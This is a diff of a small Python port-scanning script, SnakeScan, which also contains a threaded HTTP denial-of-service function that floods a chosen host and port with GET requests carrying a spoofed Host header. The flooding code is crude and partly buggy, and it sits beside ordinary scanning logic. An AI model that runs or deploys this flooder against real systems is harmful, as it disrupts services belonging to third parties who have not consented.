@@ -1,5 +1,5 @@
-"""Module SnakeScan using to scan port or ports in you device or other devices"""
-__version__="1.4.0"
+"""Module SnakeScan"""
+__version__="1.2.8"
 import socket
 from art import tprint
 from datetime import datetime
@@ -17,12 +17,12 @@ boolean=0
 OpenPorts=[]
 ports = {
     20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
-    25: "SMTP", 43: "WHOIS", 53: "DNS", 67:"DHCP", 68:"DHCP", 69:"TFTP", 80: "http", 110:"POP3",
-    115: "SFTP", 123: "NTP", 139:"NetBios", 143: "IMAP", 161: "SNMP",
-    179: "BGP", 443: "HTTPS", 445: "MICROSOFT-DS", 465:"SSL/TLS",
-    514: "SYSLOG", 515: "PRINTER", 554:"RTSP", 587:"TLS/STARTTLS", 993: "IMAPS",
+    25: "SMTP", 43: "WHOIS", 53: "DNS", 80: "http",
+    115: "SFTP", 123: "NTP", 143: "IMAP", 161: "SNMP",
+    179: "BGP", 443: "HTTPS", 445: "MICROSOFT-DS",
+    514: "SYSLOG", 515: "PRINTER", 993: "IMAPS",
     995: "POP3S", 1080: "SOCKS", 1194: "OpenVPN",
-    1433: "SQL Server", 1723: "PPTP", 2222:"SSH", 3128: "HTTP",
+    1433: "SQL Server", 1723: "PPTP", 3128: "HTTP",
     3268: "LDAP", 3306: "MySQL", 3389: "RDP",
     5432: "PostgreSQL", 5900: "VNC", 8080: "Tomcat", 10000: "Webmin" }
 def is_port_open(host,port):
@@ -37,19 +37,6 @@ def is_port_open(host,port):
 	else:
 		s.close()
 		return True
-def dos_threads(host,port,fake_ip):
-	        host=host.strip("--d")
-	        host=host.strip()
-	        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	        try:
-	            s.connect((host,port))
-	            s.sendto(("GET /"+host+"HTTP/1.1\r\n").encode("ascii"),(host,port))
-	            s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),(host,port))
-	            s.close()
-	            return True
-	        except:
-	           s.close()
-	           return False
 def is_port_open_threads(host,port):
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
@@ -66,31 +53,26 @@ def is_port_open_threads(host,port):
 		    s.close()
 	else:
 		print(f"Open{colored('|√|','green')}-->{ports[all]}|{all}|")
+def dos_threads(host,port,fake_ip):
+	        host=host.strip("--d")
+	        host=host.strip()
+	        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	        try:
+	            s.connect((host,port))
+	            s.sendto(("GET /"+host+"HTTP/1.1\r\n").encode("ascii"),(host,port))
+	            s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),(host,port))
+	            s.close()
+	            return True
+	        except:
+	           s.close()
+	           return False
 print("–"*60)
 tprint("SnakeScan")
 print("–"*60)
-print(f"{__version__}".rjust(60))
+print(f"Release:{__version__}".rjust(60))
 print(f"Skip{colored('|*|','blue')}Error: {colored('Host','green')}{colored('[X]:Error','red')} {colored('|$|','green')} {colored('Port','green')}{colored('[X]:Error','red')}")
-print("Host:[host --i,host --d] Port:[--s port,--a,--t]")
 while Run_now:
 	host=input(f"{colored('[$]','green')}Host-->")
-	if "--i" in host:
-	    host=host.strip("--i").strip()
-	    print("".center(60,"-"))
-	    try:
-	        hostname=socket.gethostbyaddr(host)
-	        print(f"Host:{hostname[0]}")
-	    except:
-	        hostname="None"
-	        print(f"Host:{hostname}")
-	    try:
-	        print(f"IP:{socket.gethostbyname(host)}")
-	    except Exception as e:
-	        print(f"IP:{e}")
-	        continue
-	    finally:
-	        print("".center(60,"-"))
-	    continue
 	if "http://" in host and "--d" in host:
 	    host=host.strip().strip("--d")
 	    host=host.split("http:")
@@ -104,20 +86,6 @@ while Run_now:
 	    host=host.strip("https:")
 	    host=host.strip("//")
 	    host=host+""+"--d"
-	    for i in range(len(host)):
-	        if host[i] == "/":
-	           host=host[0:i]
-	if "http://" in host:
-	    host=host.strip()
-	    host=host.split("http:")
-	    host=host.strip("//")
-	    for i in range(len(host)):
-	        if host[i] == "/":
-	           host=host[0:i]
-	if "https://" in host:
-	    host=host.strip()
-	    host=host.strip("https:")
-	    host=host.strip("//")
 	    for i in range(len(host)):
 	        if host[i] == "/":
 	           host=host[0:i]
@@ -148,7 +116,7 @@ while Run_now:
 			                               print(f"Error:{error}")			                 
 			                               continue
 			                           if threadsnum:
-			                               break
+			                               break			     
 			           for dos in range(0,threadsnum):
 			               num+=1
 			               t=Thread(target=dos_threads,kwargs={"host":host,"port":dos_port,"fake_ip":fake_ip})
@@ -156,7 +124,7 @@ while Run_now:
 			               t.join()
 			           if dos_threads(host,dos_port,fake_ip):
 			               print("Dos-Information".center(60,"-"))
-			               print(f"{colored('[$]','green')}Threads--> {num} GET/HTTP/1.1")
+			               print(f"{colored('[$]','green')}Threads--> {num} GET/{host}:{dos_port} HTTP/1.1")
 			               
 			           else:
 			               try:
@@ -175,18 +143,8 @@ while Run_now:
 	        host=input(f"{colored('[$]','green')}Host-->")
 	        if host:
 	            break
-	if "--l" in host:
-	   local=""
-	   s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	   try:
-	       s.connect(('10.255.255.255',1))
-	       local=s.getsockname()[0]
-	   except Exception as e:
-	       local=f"127.0.0.1:{e}"
-	   finally:
-	       s.close()
-	       print(local)
-	       continue		
+	if host == "localhost":
+	    host=socket.gethostbyname(socket.gethostname())		
 	port_user=input(f"{colored('[$]','green')}Port-->")
 	if port_user == "":
 	    while True:
@@ -219,10 +177,13 @@ while Run_now:
 			                           print(f"Closed{colored('|X|','red')}-->|{all}|")
 			           continue
 			   if "--s" in str(port_user):
-			       port_user=port_single.strip("--s")
-			       port_user=port_user.split()
+			       port_user=port_single.strip().strip("--s")[1:len(port_user)]
+			       for i in range(len(port_user)):
+			           if port_user[i] == " ":
+			               port_user=port_user[0:i]
+			               break
 			       try:
-			           port_user=int(port_user[0])
+			           port_user=int(port_user)
 			       except:
 			           port_user="None"
 			       for singel in range(1):
